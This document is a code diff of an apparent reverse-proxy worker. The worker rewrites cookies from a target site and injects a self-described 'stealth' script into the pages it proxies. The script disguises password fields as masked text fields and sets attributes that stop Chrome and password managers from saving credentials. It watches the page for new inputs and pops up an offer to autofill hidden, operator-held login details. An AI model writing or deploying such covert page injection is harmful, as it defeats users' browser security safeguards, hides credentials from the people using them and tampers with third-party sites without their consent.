@@ -238,7 +238,7 @@ export default {
                 const proxyRes = await fetch(targetUrlStr, fetchConfig);
                 const responseHeaders = new Headers();
                 
-                for (const [key, value] of proxyRes.headers.entries()) {
+                for (const[key, value] of proxyRes.headers.entries()) {
                     if (key.toLowerCase() === 'set-cookie') {
                         let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
                         responseHeaders.append('Set-Cookie', modCookie);
@@ -858,7 +858,7 @@ export default {
                 
                 const encTargetTrim = encrypt(targetDomain).substring(0,8);
                 
-                // 🔥 THE ULTIMATE RESPONSIVE POPUP SCRIPT
+                // 🔥 PERFECT STEALTH SCRIPT (15px Margin Popup + Typing Unfrozen + Anti-Chrome Save)
                 const stealthScript = `<script>
 (function(){
     try{
@@ -968,41 +968,53 @@ export default {
             } catch(e){}
         }
 
-        // ✅ PERFECT AUTO-FILL POPUP
+        // ✅ PERFECT AUTO-FILL POPUP & ANTI-CHROME SAVE
         window.addEventListener('DOMContentLoaded', () => {
             const au = "${autoUser}"; const ap = "${autoPwd}";
             if(!au || !ap) return;
 
-            // 1. Extreme Anti Chrome Password Save
+            // 1. Extreme Anti Chrome Password Save (NO INTERVAL - Fixes Typing Freeze)
             let style = document.createElement('style');
             style.innerHTML = '.nx-mask { -webkit-text-security: disc !important; font-family: text-security-disc, sans-serif !important; letter-spacing: 2px; }';
             document.head.appendChild(style);
 
-            setInterval(() => {
-                document.querySelectorAll('input[type="password"]').forEach(el => {
-                    el.setAttribute('type', 'text');
-                    el.classList.add('nx-mask');
-                    el.setAttribute('autocomplete', 'nx-off-' + Math.random());
-                    el.setAttribute('spellcheck', 'false');
-                });
-                document.querySelectorAll('input[type="text"], input[type="email"]').forEach(el => {
-                    let n = (el.name||'').toLowerCase(), p = (el.placeholder||'').toLowerCase();
-                    if(n.includes('user') || p.includes('user') || n.includes('email') || n.includes('login') || el.classList.contains('nx-mask')) {
-                        el.setAttribute('autocomplete', 'nx-off-' + Math.random());
+            const secureInputs = () => {
+                document.querySelectorAll('input').forEach(el => {
+                    if (el.dataset.nxSecured) return; 
+                    
+                    let type = (el.getAttribute('type') || '').toLowerCase();
+                    let name = (el.name || '').toLowerCase();
+                    let placeholder = (el.placeholder || '').toLowerCase();
+
+                    if (type === 'password' || el.classList.contains('nx-mask')) {
+                        el.setAttribute('type', 'text');
+                        el.classList.add('nx-mask');
+                        el.setAttribute('autocomplete', 'new-password');
                         el.setAttribute('spellcheck', 'false');
+                        el.setAttribute('data-lpignore', 'true');
+                        el.dataset.nxSecured = "true";
+                    } else if (name.includes('user') || placeholder.includes('user') || name.includes('email') || name.includes('login')) {
+                        el.setAttribute('autocomplete', 'off');
+                        el.setAttribute('spellcheck', 'false');
+                        el.setAttribute('data-lpignore', 'true');
+                        el.dataset.nxSecured = "true";
                     }
                 });
-            }, 300);
+            };
 
-            // 2. Center-Fixed Overlay UI
+            secureInputs();
+            let domObserver = new MutationObserver(() => secureInputs());
+            domObserver.observe(document.body, { childList: true, subtree: true });
+
+            // 2. Responsive UI (Pure CSS 15px gap on left/right)
             let overlay = document.createElement('div');
             overlay.id = 'nx-popup-overlay';
-            overlay.style.cssText = 'position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.65); backdrop-filter:blur(5px); z-index:2147483647; display:none; align-items:center; justify-content:center; padding:0 10px; box-sizing:border-box;';
+            overlay.style.cssText = 'position:fixed; inset:0; background:rgba(0,0,0,0.7); backdrop-filter:blur(5px); z-index:2147483647; display:none; align-items:center; justify-content:center; padding:0 15px; box-sizing:border-box;';
             
             let popup = document.createElement('div');
             popup.id = 'nx-popup-box';
             popup.innerHTML = \`
-                <div style="background:#0a0a0a; border:1px solid rgba(255,255,255,0.1); width:100%; padding:24px; border-radius:14px; display:flex; flex-direction:column; gap:14px; box-shadow:0 25px 50px -12px rgba(0,0,0,0.9); font-family:sans-serif; box-sizing:border-box;">
+                <div style="background:#0a0a0a; border:1px solid rgba(255,255,255,0.1); width:100%; max-width:420px; padding:24px; border-radius:14px; display:flex; flex-direction:column; gap:14px; box-shadow:0 25px 50px -12px rgba(0,0,0,0.9); font-family:sans-serif; box-sizing:border-box;">
                     <div style="display:flex; align-items:center; gap:10px; border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:12px;">
                         <div style="width:30px; height:30px; border-radius:50%; background:rgba(74,222,128,0.1); display:flex; align-items:center; justify-content:center; border:1px solid rgba(74,222,128,0.2);">
                             <svg style="width:16px;height:16px;color:#4ade80;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8V7z"></path></svg>
@@ -1016,32 +1028,21 @@ export default {
                     </div>
                 </div>
             \`;
-            popup.style.cssText = 'width:100%; max-width:340px; margin:auto; transition: transform 0.2s ease; transform-origin: center center;';
-            
             overlay.appendChild(popup);
             document.body.appendChild(overlay);
 
             let hasFilled = false;
             let rejected = false;
-
-            // Smart Scaler
-            const showPopup = () => {
-                if (hasFilled || rejected) return;
-                let scale = 1;
-                if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
-                    if (window.innerWidth > 450) {
-                        scale = window.innerWidth / 360;
-                        if(scale > 2.5) scale = 2.5; // Prevent it from being ridiculously large
-                    }
-                }
-                popup.style.transform = 'scale(' + scale + ')';
-                overlay.style.display = 'flex';
-            };
+            let lastFocusedInput = null;
 
             document.getElementById('nx-btn-no').onclick = (e) => {
                 e.preventDefault();
                 overlay.style.display = 'none';
                 rejected = true;
+                // Allow manual typing by focusing back!
+                if(lastFocusedInput) {
+                    setTimeout(() => lastFocusedInput.focus(), 100);
+                }
             };
 
             document.getElementById('nx-btn-yes').onclick = (e) => {
@@ -1076,11 +1077,13 @@ export default {
 
             // Trigger Listeners
             const checkTrigger = (e) => {
+                if (hasFilled || rejected) return;
                 if (e.target.tagName === 'INPUT') {
                     let n = (e.target.name||'').toLowerCase();
                     let p = (e.target.placeholder||'').toLowerCase();
                     if (e.target.classList.contains('nx-mask') || e.target.type === 'password' || n.includes('user') || p.includes('user') || n.includes('login')) {
-                        showPopup();
+                        lastFocusedInput = e.target;
+                        overlay.style.display = 'flex';
                         e.target.blur(); // Dismiss mobile keyboard instantly
                     }
                 }
